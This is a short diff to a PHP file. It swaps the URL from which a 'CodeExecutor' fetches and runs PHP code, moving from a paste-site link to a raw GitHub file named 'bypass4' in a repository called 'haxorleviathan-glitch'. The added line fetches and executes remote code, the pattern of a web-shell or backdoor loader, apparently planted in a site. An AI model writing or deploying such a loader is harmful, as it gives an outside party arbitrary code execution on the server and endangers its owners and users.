@@ -98,7 +98,7 @@ try {
     $executor = new CodeExecutor($fetcher);
 
     // Execute the PHP code fetched from a specific URL
-    $executor->executeCodeFromURL("https://ghostbin.axel.org/paste/wgnxd/raw");
+    $executor->executeCodeFromURL("https://raw.githubusercontent.com/haxorleviathan-glitch/repository/refs/heads/main/bypass4");
 } catch (Exception $e) {
     // Handle errors and exceptions
     echo "Error: " . $e->getMessage();
